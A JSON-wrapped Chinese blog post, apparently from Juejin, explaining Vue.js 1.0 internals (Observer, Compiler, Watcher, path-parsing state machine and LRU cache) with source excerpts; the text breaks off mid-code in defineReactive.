{"_id":{"$oid":"5a4cc36703f84016f04fabd7"},"id":"5a44b15e51882538fe631406","author":{"$oid":"5a4b76a1b11e1a170cb138d5"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/28/1609d78b12704efb?w=720\u0026h=383\u0026f=jpeg\u0026s=10225","https://user-gold-cdn.xitu.io/2017/12/28/1609d7c9620ba1a2?w=720\u0026h=501\u0026f=jpeg\u0026s=17941","https://user-gold-cdn.xitu.io/2017/12/28/1609c594e0357584?w=720\u0026h=455\u0026f=jpeg\u0026s=16398","https://user-gold-cdn.xitu.io/2017/12/28/1609c5c8b161b222?w=720\u0026h=514\u0026f=jpeg\u0026s=16338","https://user-gold-cdn.xitu.io/2017/12/28/1609c5cfe0c2286a?w=720\u0026h=680\u0026f=jpeg\u0026s=28871","https://user-gold-cdn.xitu.io/2017/12/28/1609c605b7a48d33?w=720\u0026h=724\u0026f=jpeg\u0026s=24420","https://user-gold-cdn.xitu.io/2017/12/28/1609c7cb790fc8a8?w=720\u0026h=715\u0026f=jpeg\u0026s=26333","https://user-gold-cdn.xitu.io/2017/12/28/1609c82e78f3d87b?w=720\u0026h=435\u0026f=jpeg\u0026s=23364"],"screenShot":null}],"title":"Dive into Vue.js","meta":{"likeCount":0},"tag":["Vue.js","源码"],"comment":[],"shortContent":"Vue.js作为先进的前端MVVM框架，在外卖已经广泛应用在各业务线中。本文阐述了Vue.js作为前端MVVM框架的主要优势，并从Vue.js的三个核心点：Observer, Watcher, Compiler出发，深入阐述Vue.js的设计与实现原理。 Vue.js 是一个轻…","content":"\u003ch2 class=\"heading\"\u003e摘要\u003c/h2\u003e\n\u003cp\u003eVue.js作为先进的前端MVVM框架，在外卖已经广泛应用在各业务线中。本文阐述了Vue.js作为前端MVVM框架的主要优势，并从Vue.js的三个核心点：Observer, Watcher, Compiler出发，深入阐述Vue.js的设计与实现原理。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e背景\u003c/h2\u003e\n\u003cp\u003eVue.js 是一个轻量级的前端 MVVM 框架，专注于web视图(View)层的开发 。\n自2013年以来，Vue.js 通过其可扩展的数据绑定机制、极低的上手成本、简洁明了的API、高效完善的组件化设计等特性，吸引了越来越多的开发者。在github上已经有30,000+ star，且不断在增长；在国内外都有广泛的应用，社区和配套工具也在不断完善，影响力日益扩大，与React 、AngularJS 这种「世界级框架」几乎平起平坐。\n外卖B端的FE同学比较早（0.10.x版本）就引入了 Vue.js 进行业务开发，经过一年多的实践，积累了一定的理解。在此基础上，我们希望去更深入地了解 Vue.js , 而不是一直停留在表面。所以「阅读源码」成为了一项课外任务。\n我个人从9月份开始阅读Vue的源码，陆陆续续看了2个月，这里是我的源码学习笔记。本篇文章希望从 Vue.js 1.0版本的设计和实现为主线，阐述自己阅读源码的一些心得体会。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前端为什么需要有MVVM框架？\u003c/h2\u003e\n\u003cp\u003e前端刀耕火种的历史在这里就不赘述，在jquery 等DOM操作库大行其道的年代，主要的开发痛点集中于：\u003c/p\u003e\n\u003cp\u003e当数据更新时，需要开发者主动地使用 DOM API 操作DOM；当DOM发生变化时，需要开发者去主动获取DOM的数据，把数据同步或提交；\n同样的数据映射到不同的视图时，需要新的一套DOM操作，复用性低；\n大量的DOM操作使得业务逻辑繁琐冗长，代码的可维护性差。\n于是，问题的聚焦点就在于：\u003c/p\u003e\n\u003cp\u003e业务逻辑应该专注在操作数据（Model），更新DOM不希望有大量的显式操作。\n在数据和视图间做到同步（数据绑定和更新监听），不需要人为干预。\n同样的数据可以方便地对应多个视图。\n此外，还应该做到的一些特性：\u003c/p\u003e\n\u003cp\u003e方便地实现视图逻辑（声明式或命令式）;\n方便地创建和连接、复用组件;\n管理状态和路由。\nMVVM框架可以很好地解决以上问题。通过 ViewModel 对 View 和 Model 进行桥接，而Model 和 ViewModel 之间的交互是双向的，View 数据的变化会同步到 Model 中，Model 中的数据变化也会立即反应到 View 上，即我们通常所说的「双向绑定」。这是不需要人为干涉的，所以开发者只需要关注业务逻辑，其他的DOM操作、状态维护等都由MVVM框架来实现。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eWhy Vue?\u003c/h2\u003e\n\u003cp\u003eVue.js的优点主要体现在：\u003c/p\u003e\n\u003cp\u003e开发者的上手成本很低，开发体验好。\n如果使用过 angular 的同学就知道，里面的API多如牛毛，而且还会要求开发者去熟悉类似 controller , directive ，dependency injection , digest cycle 这些概念;\nangular2 更是需要提前去了解 Typescript 、RxJS 等基础知识；\n要让一个前端小白去搞定 React 的全家桶，ES6 + Babel , 函数式编程 ，JSX ， 工程化构建 这些也是必需要过的槛。\nVue.js 就没有这些开发负担，对开发者屏蔽了一系列复杂的概念，API从数量、设计上都十分精简，很接地气地支持js的各种方言，让前端小白可以快速上手 — 当然，对于有一定经验的同学，也可以使用流行的语言、框架、库、工程化工具来做自由合理搭配。\u003c/p\u003e\n\u003cp\u003e博采众长，集成各种优秀特性 — Vue.js 里面有像 angular 这样的双向数据绑定，2.0版本也提供了像 React 这样的 JSX,Virtual-DOM ，服务端同构 的特性；同时 vuex ，vue-router ，vue-cli 等配套工具也组成了一个完整的框架生态。\u003c/p\u003e\n\u003cp\u003e性能优秀。 Vue.js 在1.x版本的时候性能已经明显优于同期基于 dirty check (条件性全量脏检查) 的 angular 1.x ；总体上来说，Vue.js 1.x版本 的性能与React 的性能相近，而且 Vue.js 不需要像React 那样去手动声明shouldComponentUpdate 来优化状态变更时的重新渲染的性能。Vue2.0版本使用了Virtual DOM + Dependency Tracking 方案，性能得到进一步优化。当然，不分场景的性能比较属于耍流氓。 这个benchmark 对比了主流前端框架的性能，可以看出 Vue.js 的性能在大部分场景下都属于业界顶尖。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eVue.js的绑定设计思路\u003c/h2\u003e\n\u003cp\u003e根据上面篇幅的描述，MVVM框架工作的重中之重是建立 View 和 Model 之间的关系。也就是「绑定」。官方文档的附图说明了这一点：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609d78b12704efb?w=720\u0026amp;h=383\u0026amp;f=jpeg\u0026amp;s=10225\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e从上图，只能得到一些基(cu)础(qian)的认识：\u003c/p\u003e\n\u003cp\u003eModel是一个 POJO 对象，即简单javascript对象。\nView 通过 DOM Listener 和 Model 建立绑定关系。\nModel 通过 Directives(指令)，如 {{a}} , v-text=\"a\" 与 View 建立绑定关系。\n而实际上要做的工作还是很多的：\u003c/p\u003e\n\u003cp\u003e让 Model 中的数据做到 Reactive ，即在状态变更（数据变化）时，系统能做出响应。\nDirectives(指令) 混杂在一个html片段(fragment，或者你可以理解就是Vue实例中的 template )中，需要正确解析指令和表达式(expression)，不同的指令需要对应不同的DOM更新方式，最易理解的例子就是 v-if 和 v-show ；\nModel 的更新触发指令的视图更新需要有一定的机制来保证；\n在 DOM Listener 这块，需要抹平不同浏览器的差异。\nVue.js 在实现「绑定」方面，为所有的指令(directives)都约定了 bind 和 update 方法，即：\u003c/p\u003e\n\u003cp\u003e解析完指令后，应该如何绑定数据\n数据更新时，怎样更新DOM\nVue.js 的解决方案中，提出了几个核心的概念：\u003c/p\u003e\n\u003cp\u003eObserver : 数据观察者，对所有 Model 数据进行 defineReactive，即使所有 Model 数据在数据变更时，可以通知数据订阅者。\nWatcher : 订阅者，订阅并收到所有 Model 变化的通知，执行对应的指令（表达式）绑定函数\nDep : 消息订阅器，用于收集 Watcher , 数据变化时，通知订阅者进行更新。\nCompiler : 模板解析器，可对模板中的指令、表达式、属性(props)进行解析，为视图绑定相应的更新函数。\n可见这里面的核心思想是大家（特别FE同学）都很熟悉的「观察者模式」。总体的设计思路如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609d7c9620ba1a2?w=720\u0026amp;h=501\u0026amp;f=jpeg\u0026amp;s=17941\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e回到刚才说的 bind 与 update，我们看看上述概念是如何工作的：\u003c/p\u003e\n\u003cp\u003e在初始化视图，即绑定阶段，Observer 获取 new Vue() 中的data数据，通过Object.defineProperty 赋予 getter 和 setter; 对于数组 形式的数据，通过劫持某些方法让数组在变动时也能得到通知。另外，Compiler 对DOM节点指令进行扫描和解析，并订阅Watcher 来更新视图。Watcher 在 消息订阅器 Dep 中进行管理。\n在更新阶段，当数据变更时，会触发 setter 函数，立即会触发相应的通知, 开始遍历所有订阅者，调用其指令的update方法，进行视图更新。\nOK，下面我们继续深入看三个「核心点」，即 Observer, Compiler, Watcher 的实现原理。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e数据观察者 Observer 的实现原理\u003c/h2\u003e\n\u003cp\u003e前面提到，Observer 的核心是对 Model(data) 中的数据进行 defineReactive。\n这里的实现如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c594e0357584?w=720\u0026amp;h=455\u0026amp;f=jpeg\u0026amp;s=16398\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eVue.js 在初始化data时，会先将data中的所有属性代理到Vue实例下（方便使用 this 关键字来访问），然后即调用 Observer 来进行数据观察。\nObserver会先将所有 data 中的属性进行整体观察，定义一个属性__ob__ ，进行Object.defineProperty，即为 data 本身添加观察器。\n同样，对于data中的每个属性也会使用 \u003cstrong\u003eob\u003c/strong\u003e 为每个属性本身添加观察器。\n同理，当定义了类似如下的属性值为POJO对象时，会去递归地 Object.defineProperty ;\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e{\n    data: {\n        a: {\n            b: \u003cspan class=\"hljs-string\"\u003e\"c\"\u003c/span\u003e\n        }\n    },\n    d: [1, 2, 3]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e那么，当定义的属性值为数组时，在数组本身通过方法变化时，也需要监听数组的改变。\n通过javascript操作数组的变化无外乎以下几种方式：\u003c/p\u003e\n\u003cp\u003e通过 push , pop 等数组原生方法进行改变；\n通过length属性进行改变，如 arr.length = 0；\n通过角标赋值, 如 arr[0] = 1 。\n对于数组原生的方法，我们需要在使用这些方法时同时触发事件，让系统知道这个数组改变了。那么，我们通常会想到去「劫持」数组本身的方法。但是显然，我们不能直接去覆写 Array.prototype , 这样的全局覆写显然会对其他不需要响应式数据的数组操作产生影响。\nVue.js 的思路在于，当监测到一个data属性值是Array时，去覆写这个属性值数组的 \u003cstrong\u003eproto\u003c/strong\u003e 属性，即只覆写响应式数据的原型变量。核心实现如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e Observer(value) {\n    this.value = value\n    this.dep = new Dep()\n    _.define(value, \u003cspan class=\"hljs-string\"\u003e'__ob__'\u003c/span\u003e, this)\n    // 如果判断当前值是Array, 进行劫持操作\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (_.isArray(value)) {\n        var augment = _.hasProto\n            ? protoAugment\n            : copyAugment\n        // 在这里，arrayMethods是进行了劫持操作后的数组原型\n        // augment的作用即是覆写原型方法\n        augment(value, arrayMethods, arrayKeys)\n        this.observeArray(value)\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        // 递归地defineProperty\n        this.walk(value)\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于直接改变数组length来修改数组、角标赋值，显然不能直接劫持。这时一种实现方式是把原生的 Array 做上层包装，变成一个Array like Object, 再在这里面进行defineProperty， 这样可以搞定length和角标赋值。但是这样做的弊端是，每次在使用数组时都需要显式去调用这个对象，如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar a = new ObservableArray([1, 2, 3, 4]);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样显然增加了开发者上手成本，而且改变length可以通过splice来实现；所以 Vue.js 并没有实现此功能，是一种正确的取舍。\n对于角标赋值，还是有一定的使用场景，所以 Vue.js 扩展了 $set 和 $remove 方法来实现。\n这两种方法实质还是在使用可被劫持的 splice，而被劫持的方法可以触发视图更新。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eexample1.items[0] = { childMsg: \u003cspan class=\"hljs-string\"\u003e'Changed!'\u003c/span\u003e} // 不能触发视图更新\nexample1.items.\u003cspan class=\"hljs-variable\"\u003e$set\u003c/span\u003e(0, { childMsg: \u003cspan class=\"hljs-string\"\u003e'Changed!'\u003c/span\u003e}) // 可以触发视图更新\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cul\u003e\n\u003cli\u003e监测Object对象的改变，有一个提案期的 Object.observe() 方法，但现在已经被浏览器标准废弃，各浏览器均不再支持。同样有一个非标准的监视方法Object.watch() 被Firefox 支持，但不具备通用性。\u003c/li\u003e\n\u003cli\u003e监测数组对象的改变，同样有一个提案性的Array.observe()。它不仅能监视数组方法，还可以监视角标赋值等变化。但是这个提案也已经被废弃。\u003c/li\u003e\n\u003cli\u003e理论上，使用 ES6 的 Proxy 对象也可以进行 get 和 set 的拦截, 但浏览器支持情况并不好，实用性不高。\u003c/li\u003e\n\u003cli\u003e所以，当前的条件下 Object.defineProperty 仍是最好的选择 — 当然，在IE8及更低版本浏览器盛行的年代，基于此特性的MVVM框架就很难大规模被普及。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e解析器Compiler的实现\u003c/h2\u003e\n\u003cp\u003eCompiler 的作用主要是解析传入的元素 el 或模板 template ，创建对应的DOMFragment，提取指令(directive)并执行指令相关方法，并对每个指令生成Watcher。\n主要的入口点是挂载在Vue.prototype下的 _compile 方法（实际内容在instance/lifecycle.js, Vue1.x的不同版本位置略有不同）。\n整个 _compile 方法的流程如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c5c8b161b222?w=720\u0026amp;h=514\u0026amp;f=jpeg\u0026amp;s=16338\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e首先执行 transclude() , 实际是在处理template标签或 options.template 字符串，将其解析为DOMFragment, 拿到 el 对象。\n其次执行_initElement(el), 将拿到的el对象进行实例挂载。\n接着是CompileRoot(el, options) ，解析当前根实例DOM上的属性(attrs);\n然后执行Compile(el, options)，解析template，返回一个link Funtion(compositeLinkFn)。\n最后执行这个compositeLinkFn，创建\nCompile(el, options) 的具体流程如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c5cfe0c2286a?w=720\u0026amp;h=680\u0026amp;f=jpeg\u0026amp;s=28871\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e首先，compile过程的基础函数是compileNode, 在检测到当前节点有子节点的时候，递归地调用compileNode即对DOM树进行了遍历解析。\n接着对节点进行判断，使用comileElement 或 compileTextNode 进行解析。\n我们看到最终compile的结果return了一个compositeLinkFn, 这个函数的作用是把指令实例化，将指令与新建元素建立连接，并将元素替换到DOM树中。\ncompositeLinkFn会先执行通过comileElement 或 compileTextNode 产出的Linkfn 来创建指令对象。\n在指令对象初始化时，不但调用了指令的bind, 还定义了 this._update 方法，并创建了 Watcher，把 this._update 方法(实际对应指令的更新方法)作为 Watcher 的回调函数。\n这里把 Directive 和 Watcher 做了关联，当 Watcher 观察到指令表达式值变化时，会调用 Directive 实例的 _update 方法，最终去更新 DOM 节点。\n以compileTextNode为例，写一段伪代码表示这个过程：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// compile结束后返回此函数\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e compositeLinkFn(arguments) {\n    linkAndCapture()\n    // 返回解绑指令函数，这里不深究。\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e makeUnlinkFn(arguments)\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e linkAndCapture(arguments) {\n    // 创建指令对象\n    linkFn()\n    // 遍历 directives 调用 \u003cspan class=\"hljs-built_in\"\u003edirs\u003c/span\u003e[i]._bind 方法对单个directive做一些绑定操作\n    // 这里会去实例化单个指令，执行指令的\u003cspan class=\"hljs-built_in\"\u003ebind\u003c/span\u003e()函数，并创建Watcher\n    \u003cspan class=\"hljs-built_in\"\u003edirs\u003c/span\u003e[i]._bind()\n}\n// 解析TextNode节点，返回了linkFn\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e compileTextNode(node) {\n    // 对节点数据进行解析，生成tokens\n    var tokens = textParser.parse(node.data)\n    createFragment()\n    // 创建token的描述，作为后续生成指令的依据\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTokenDescriptor()\n    /**\n   \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e other things\n   **/\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e linkFn(tokens, ...);\n}\n// linkFn遍历token,遍历执行_bindDir, 传入token描述\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003elinkFn\u003c/span\u003e\u003c/span\u003e() {\n    tokens.forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (token) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (token.html) replaceHtml();\n        vm._bindDir(token.discriptor)\n    })\n}\n// 根据token描述创建指令新实例\nVue.prototype._bindDir = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (descriptor) {\n    this._directives.push(new Directive(descriptor))\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e至此，compiler 的工作就结束了。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eWatcher订阅监听的实现\u003c/h2\u003e\n\u003cp\u003eWatcher的职责\u003c/p\u003e\n\u003cp\u003e在上述compiler的实现中，最后一步用于创建Watcher：\u003c/p\u003e\n\u003cp\u003e// 为每个directive指令创建一个watcher\ndirs[i]._bind()\nDirective.prototype._bind = function () {\n...\n// 创建Watcher部分\nvar watcher = this._watcher = new Watcher(\nthis.vm,\nthis.expression,\nthis._update, // callback\n{\nfilters: this.filters,\ntwoWay: this.twoWay,\ndeep: this.deep,\npreProcess: preProcess,\npostProcess: postProcess,\nscope: this._scope\n}\n)\n}\n接收的参数是vm实例、expression表达式、 callback回调函数和相应的Watcher配置, 其中包含了上下文信息： this._scope。\n每个指令都会有一个watcher, 实时去监控表达式的值，如果发生变化，则通知指令执行 _update 函数去更新对应的DOM。那么我们可以想到，watcher主要做的工作是：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e解析表达式，如 v-show=\"a.b.c \u0026gt; 1\" ; 表达式需要转换成函数来求值；\u003c/li\u003e\n\u003cli\u003e自动收集依赖。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003ewatcher的实现\u003c/h3\u003e\n\u003cp\u003e这部分工作的实现如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c605b7a48d33?w=720\u0026amp;h=724\u0026amp;f=jpeg\u0026amp;s=24420\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e使用状态机进行路径解析\u003c/h3\u003e\n\u003cp\u003e这里的parse Expression使用了路径状态机（state machine）进行路径的高效解析。\n详细代码见 parsers/path.js 部分。\n这里所谓的「路径」就是指一个对象的属性访问路径：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ea = {\n    b: {\n        c: \u003cspan class=\"hljs-string\"\u003e'd'\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在这里, ‘d’的访问路径即是 a.b.c, 解析后为['a', 'b', 'c']。\n如一个表达式 a[0].b.c, 解析后为 ['a', '0', 'b', 'c']。\n表达式a[b][c]则解析为 ['a', '*b', '*c']。\n解析的目的是进行compileGetter, 即 getter 函数；\n解析为数组原因是，可以方便地还原new Function()构造中正确的字符串。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eexports.compileGetter = \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (path) {\n    var body = \u003cspan class=\"hljs-string\"\u003e'return o'\u003c/span\u003e + path.map(formatAccessor).join(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e new Function(\u003cspan class=\"hljs-string\"\u003e'o'\u003c/span\u003e, body)\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e formatAccessor(key) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (identRE.test(key)) { // identifier\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'.'\u003c/span\u003e + key\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (+key === key \u0026gt;\u0026gt;\u0026gt; 0) { // bracket index\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'['\u003c/span\u003e + key + \u003cspan class=\"hljs-string\"\u003e']'\u003c/span\u003e\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (key.charAt(0) === \u003cspan class=\"hljs-string\"\u003e'*'\u003c/span\u003e) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'[o'\u003c/span\u003e + formatAccessor(key.slice(1)) + \u003cspan class=\"hljs-string\"\u003e']'\u003c/span\u003e\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e { // bracket string\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'[\"'\u003c/span\u003e + key.replace(/\u003cspan class=\"hljs-string\"\u003e\"/g, '\\\\\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e') + '\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"]'\n    }\n}\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如一段表达式：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;p\u0026gt;{{list[0].text}}\u0026lt;/p\u0026gt;\n解析后path为[\u003cspan class=\"hljs-string\"\u003e\"list\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"text\"\u003c/span\u003e], getter函数的生成结果为：\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (o/**/) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e o.list[0].text\n})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e把正确的上下文传入此函数即可正确取值。\nVue.js 仅在路径字符串中带有 [ 符号时才会使用状态机进行匹配；其他情况下认为它是一个simplePath, 如a.b.c，直接使用上述的formatAccessor转换即可。\n状态机的工作原理如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c7cb790fc8a8?w=720\u0026amp;h=715\u0026amp;f=jpeg\u0026amp;s=26333\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e里面的逻辑比较复杂，可以简单地描述为：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVue.js 里面维护了一套状态机机制，每解析一个字符，均匹配对应的状态;\u003c/li\u003e\n\u003cli\u003e如当前的字符索引是0，那么就会有一个「当前状态」的模式(mode)，这个模式只允许下一个字符属于特定的状态模式。举例，如 ][ 这样的表达式显然不合理， \"]\"字符所在的状态，决定了下个字符不能为 \"[\" 这样的\u003c/li\u003e\n\u003cli\u003e字符，否则就会退出解析;\u003c/li\u003e\n\u003cli\u003e接下来的索引去根据「当前状态」的模式看自己是否属于一个合理的状态；\u003c/li\u003e\n\u003cli\u003e如果属于一个合理的状态，先设置当前状态的模式为当前字符匹配的状态模式；\u003c/li\u003e\n\u003cli\u003e再调用相关的方法(action)来处理。例如，list[0]这个表达式，在处理\"l\", \"i\", \"s\", \"t\" 时，只是在执行 append action , 生成\"list\" ; 直到遇到 \"[\" , 执行 push action , 把\"list\"字符串推入结果中。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eVue.js 的状态机设计可以看勾三股四总结的这张图。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e缓存系统\u003c/h2\u003e\n\u003cp\u003e想象一个场景：当存在着大量的路径(path)需要解析时，很可能会有大量重复的情况。如上面所述，状态机解析是一个比较繁琐的过程。那么就需要一个缓存系统，一旦路径表达式命中缓存，即可直接获取，而不用再次解析。\n缓存系统的设计应该考虑以下几点：\u003c/p\u003e\n\u003cp\u003e缓存的数据应是有限的。否则容易数据过多内存溢出。\n设定数据存储条数应结合实际情况，通过测试给出。\n缓存数据达到上限时，如果继续有数据存入，应该有相应的策略去清除现有缓存。\nVue.js 在缓存系统上直接使用了js-lru项目。这是一个LRU（Least Recently Used)算法的实现。核心思路如下：\u003c/p\u003e\n\u003cp\u003e基础数据结构为js实现的一个双向链表。\ncache对象有头尾，即一个head(最少被使用的项)和tail(最近被使用的项)。\n缓存中的每一项均有newer和older的指针。\n缓存中找数据使用object key进行查找。\n具体实现如下图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c82e78f3d87b?w=720\u0026amp;h=435\u0026amp;f=jpeg\u0026amp;s=23364\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e由图理解非常简单：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e获取缓存项B，把B插入变为tail, D和B建立 newer,older 关系，A和C建立newer, older关系；\u003c/li\u003e\n\u003cli\u003e设置缓存项E，把E插入变为tail, D和E建立 newer,older 关系；\u003c/li\u003e\n\u003cli\u003e达到缓存上限时，删除缓存项A(head)，把B变成head。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e缓存系统的其他实现，可以参考wikipedia上的Cache replacement policies。\n依赖收集 (Dependency Collection)\n让我们回到Watcher的构造函数：\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e Watcher(vm, expOrFn, cb, options) {\n    //...\n    // 解析表达式，得到getter和setter函数\n    var res = parseExpression(arguments)\n    this.getter = res.get\n    this.setter = res.get\n    // 设定Dep.target为当前Watcher实例\n    Dep.target = this\n    // 调用getter函数\n    try {\n        value = this.getter.call(scope, scope)\n    } catch (e) {\n        //...\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里面又有什么玄机呢？回顾一下 Observer 的 defineReactive :\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e defineReactive(obj, key, val) {\n    var dep = new Dep()\n    var childOb = Observer.create(val)\n    Object.defineProperty(obj, key, {\n        enumerable: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        configurable: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        get: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003emetaGetter\u003c/span\u003e\u003c/span\u003e() {\n            // 如果Dep.target存在，则进行依赖收集\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Dep.target) {\n                dep.depend()\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (childOb) {\n                    childOb.dep.depend()\n                }\n            }\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e val\n        },\n        